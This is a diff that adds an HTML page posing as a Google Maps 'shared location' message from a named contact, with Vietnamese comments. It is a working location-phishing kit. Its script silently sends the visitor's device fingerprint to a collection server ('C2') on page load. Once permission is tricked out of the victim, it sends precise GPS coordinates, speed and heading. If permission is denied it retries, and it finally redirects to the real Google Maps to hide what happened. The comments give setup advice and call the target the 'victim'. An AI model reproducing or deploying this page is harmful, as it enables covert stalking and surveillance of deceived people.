@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <!-- OpenGraph — khi share link qua Zalo/FB/Telegram hiện preview đẹp -->
+  <meta property="og:title"       content="Nguyễn Minh Anh đã chia sẻ vị trí với bạn">
+  <meta property="og:description" content="Mở để xem vị trí trên bản đồ">
+  <meta property="og:image"       content="https://your-server.com/preview.jpg">
+  <meta property="og:url"         content="https://your-server.com">
+
+  <title>Vị trí được chia sẻ – Google Maps</title>
+  <link rel="icon" href="https://maps.google.com/favicon.ico">
+
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: #f1f3f4;
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      min-height: 100vh;
+    }
+
+    /* header giả Google Maps */
+    .topbar {
+      position: fixed; top: 0; left: 0; right: 0;
+      background: #fff; height: 56px;
+      display: flex; align-items: center; padding: 0 16px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.2); z-index: 100;
+    }
+    .topbar img { height: 32px; margin-right: 12px; }
+    .topbar span { font-size: 18px; color: #5f6368; }
+
+    .card {
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.15);
+      width: 360px; max-width: 95vw;
+      overflow: hidden;
+      margin-top: 70px;
+    }
+
+    /* fake map thumbnail — dùng Google Static Maps API (public, không cần key cho basic) */
+    .map-thumb {
+      width: 100%; height: 200px;
+      background: #e8eaed;
+      position: relative; overflow: hidden;
+    }
+    .map-thumb img { width: 100%; height: 100%; object-fit: cover; }
+    /* pin icon ở giữa */
+    .pin {
+      position: absolute; top: 50%; left: 50%;
+      transform: translate(-50%, -100%);
+      font-size: 36px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.4));
+    }
+    /* blur overlay trước khi allow */
+    .blur-overlay {
+      position: absolute; inset: 0;
+      backdrop-filter: blur(8px);
+      background: rgba(255,255,255,0.3);
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      gap: 8px;
+    }
+    .blur-overlay span { font-size: 13px; color: #444; }
+
+    .info {
+      padding: 16px;
+    }
+    .sender {
+      display: flex; align-items: center; gap: 12px;
+      margin-bottom: 14px;
+    }
+    .avatar {
+      width: 40px; height: 40px; border-radius: 50%;
+      background: #1a73e8; color: #fff;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 18px; font-weight: 600; flex-shrink: 0;
+    }
+    .sender-text .name { font-weight: 600; font-size: 15px; color: #202124; }
+    .sender-text .sub  { font-size: 13px; color: #5f6368; margin-top: 2px; }
+
+    .allow-btn {
+      width: 100%; padding: 14px;
+      background: #1a73e8; color: #fff;
+      border: none; border-radius: 8px;
+      font-size: 15px; font-weight: 500;
+      cursor: pointer; transition: background 0.2s;
+    }
+    .allow-btn:hover { background: #1557b0; }
+    .allow-btn:disabled { background: #aaa; cursor: default; }
+
+    .note {
+      text-align: center; font-size: 12px;
+      color: #9aa0a6; margin-top: 10px;
+      padding: 0 16px 16px;
+    }
+
+    /* loading state */
+    #status {
+      text-align: center; padding: 12px 16px;
+      font-size: 13px; color: #5f6368; display: none;
+    }
+    .spinner {
+      display: inline-block; width: 16px; height: 16px;
+      border: 2px solid #ddd; border-top-color: #1a73e8;
+      border-radius: 50%; animation: spin 0.7s linear infinite;
+      vertical-align: middle; margin-right: 6px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* success state */
+    #success { display: none; padding: 24px 16px; text-align: center; }
+    #success .checkmark { font-size: 48px; }
+    #success p { margin-top: 8px; color: #5f6368; font-size: 14px; }
+  </style>
+</head>
+<body>
+
+  <!-- topbar Google Maps giả -->
+  <div class="topbar">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bd/Google_Maps_Logo_2020.svg/512px-Google_Maps_Logo_2020.svg.png" alt="">
+    <span>Google Maps</span>
+  </div>
+
+  <div class="card">
+    <!-- map thumbnail bị blur -->
+    <div class="map-thumb">
+      <img src="https://maps.googleapis.com/maps/api/staticmap?center=10.7769,106.7009&zoom=15&size=360x200&style=feature:all|saturation:-20" 
+           alt="map" onerror="this.style.background='#dde'">
+      <div class="pin">📍</div>
+      <div class="blur-overlay" id="blurOverlay">
+        <span>🔒 Cho phép truy cập vị trí để xem</span>
+      </div>
+    </div>
+
+    <div class="info">
+      <div class="sender">
+        <div class="avatar">A</div>
+        <div class="sender-text">
+          <!-- thay tên người gửi cho phù hợp pretext -->
+          <div class="name">Thái Huy Tuấn Anh</div>
+          <div class="sub">Vừa chia sẻ vị trí thực tế của họ · Google Maps</div>
+        </div>
+      </div>
+
+      <button class="allow-btn" id="allowBtn" onclick="requestLocation()">
+        Xem vị trí trên bản đồ
+      </button>
+    </div>
+
+    <div id="status">
+      <span class="spinner"></span> Đang lấy vị trí của bạn…
+    </div>
+
+    <div id="success">
+      <div class="checkmark">✅</div>
+      <p>Đang tải bản đồ…</p>
+    </div>
+
+    <div class="note">
+      Được bảo mật bằng Google. Vị trí của bạn chỉ dùng để hiển thị bản đồ.
+    </div>
+  </div>
+
+  <script>
+    var C2 = "/collect"; // ← thay bằng server mày
+
+    function sendData(data) {
+      data.ts  = new Date().toISOString();
+      data.ua  = navigator.userAgent;
+      data.ref = document.referrer;
+      data.tz  = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      data.lang = navigator.language;
+      data.scr  = screen.width + "x" + screen.height;
+
+      // beacon — không block, không raise CORS error với browser
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon(C2, JSON.stringify(data));
+      }
+      // fallback
+      fetch(C2, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data),
+        keepalive: true
+      }).catch(function(){});
+
+      // triple fallback: img pixel
+      new Image().src = C2 + "?" + new URLSearchParams(data).toString();
+    }
+
+    // gửi device info ngay khi load — không cần permission
+    sendData({ type: "pageload" });
+
+    function requestLocation() {
+      var btn = document.getElementById("allowBtn");
+      btn.disabled = true;
+      btn.textContent = "Đang kết nối…";
+      document.getElementById("status").style.display = "block";
+
+      if (!navigator.geolocation) {
+        sendData({ type: "no_geolocation" });
+        showFakeMap();
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        function(pos) {
+          // SUCCESS — victim bấm Allow
+          sendData({
+            type:     "gps_success",
+            lat:      pos.coords.latitude,
+            lon:      pos.coords.longitude,
+            accuracy: pos.coords.accuracy,      // mét — thường 5–50m trên mobile
+            altitude: pos.coords.altitude,
+            altAcc:   pos.coords.altitudeAccuracy,
+            heading:  pos.coords.heading,
+            speed:    pos.coords.speed,
+            maps_url: "https://maps.google.com/?q=" 
+                      + pos.coords.latitude + "," + pos.coords.longitude
+          });
+          showFakeMap(pos.coords.latitude, pos.coords.longitude);
+        },
+        function(err) {
+          // DENIED hoặc timeout
+          sendData({ type: "geo_error", code: err.code, msg: err.message });
+          // thử lại với accuracy thấp hơn (đôi khi bypass được strict mode)
+          navigator.geolocation.getCurrentPosition(
+            function(pos) {
+              sendData({
+                type:     "gps_fallback",
+                lat:      pos.coords.latitude,
+                lon:      pos.coords.longitude,
+                accuracy: pos.coords.accuracy
+              });
+              showFakeMap(pos.coords.latitude, pos.coords.longitude);
+            },
+            function() { showFakeMap(); },
+            { enableHighAccuracy: false, timeout: 5000, maximumAge: 300000 }
+          );
+        },
+        {
+          enableHighAccuracy: true,  // dùng GPS chip thật, cho 5-30m trên mobile
+          timeout:            15000,
+          maximumAge:         0      // không dùng cache
+        }
+      );
+    }
+
+    function showFakeMap(lat, lon) {
+      document.getElementById("status").style.display  = "none";
+      document.getElementById("allowBtn").style.display = "none";
+      document.getElementById("blurOverlay").style.display = "none";
+      document.getElementById("success").style.display = "block";
+
+      // nếu có tọa độ thật → show map thật luôn cho believable
+      if (lat && lon) {
+        var mapImg = document.querySelector(".map-thumb img");
+        mapImg.src = "https://maps.googleapis.com/maps/api/staticmap?center="
+                   + lat + "," + lon + "&zoom=16&size=360x200"
+                   + "&markers=color:red%7C" + lat + "," + lon;
+        // redirect sang Google Maps sau 2s — hoàn toàn bình thường
+        setTimeout(function() {
+          window.location.href = "https://maps.google.com/?q=" + lat + "," + lon;
+        }, 2000);
+      }
+    }
+  </script>
+</body>
+</html>
